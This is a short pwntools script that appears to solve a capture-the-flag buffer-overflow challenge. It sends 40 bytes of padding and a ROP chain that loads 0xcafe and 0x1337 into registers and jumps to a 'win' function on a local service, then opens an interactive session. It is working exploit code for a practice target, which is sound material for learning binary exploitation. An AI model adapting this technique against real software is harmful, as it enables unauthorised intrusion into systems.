from pwn import *

# r = process("./bof")
r = remote("localhost", 5011)
pause()

POP_RDI_RET = 0x4005f3
POP_RSI_R15_RET = 0x4005f1
WIN = 0x400537

PAYLOAD = b"A" * 40
PAYLOAD += p64(POP_RDI_RET) + p64(0xcafe)
PAYLOAD += p64(POP_RSI_R15_RET) + p64(0x1337) + p64(0)
PAYLOAD += p64(WIN)

r.sendline(PAYLOAD)
r.interactive()
